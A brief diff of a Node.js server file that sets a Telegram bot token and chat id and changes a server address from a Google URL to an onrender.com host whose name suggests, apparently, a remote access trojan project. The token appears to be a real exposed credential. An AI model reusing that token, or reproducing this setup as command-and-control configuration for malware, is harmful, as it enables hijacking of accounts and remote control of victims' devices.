@@ -9,7 +9,7 @@ const axios = require("axios");
 
 const token = '6378978436:AAGZi8TVcAXb4X-vG3vBedlp04LugwuVKWc'
 const id = '821702704'
-const address = 'https://www.google.com'
+const address = 'https://projectratgwehjir.onrender.com'
 
 const app = express();
 const appServer = http.createServer(app);
